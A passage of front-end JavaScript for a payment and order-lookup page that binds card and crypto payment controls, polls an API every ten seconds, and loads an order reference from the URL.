      b.addEventListener("click", function () { switchPayTab(b.dataset.paytab); });
    });
    var cardBtn = $("#payCardSubmit");
    if (cardBtn) cardBtn.addEventListener("click", submitCardPayment);
    var copyAddr = $("#payCopyAddress");
    if (copyAddr) copyAddr.addEventListener("click", function () {
      var addr = $("#payCryptoAddress") && $("#payCryptoAddress").textContent.trim();
      if (addr && addr !== "—") copyText(addr, copyAddr);
    });
    autoFormatCard();

    document.addEventListener("fmc:langchange", function () {
      if (currentRef) renderAll(currentRef);
    });

    /* Periodic sync — fetch from API every 10s */
    setInterval(function () { if (currentRef) softReload(); }, 10000);

    /* Auto-load from ?ref= or ?id= */
    var params = new URLSearchParams(location.search);
    var ref = params.get("ref") || params.get("id");
    if (ref) { input.value = ref.toUpperCase(); lookup(ref); }
  });
})();
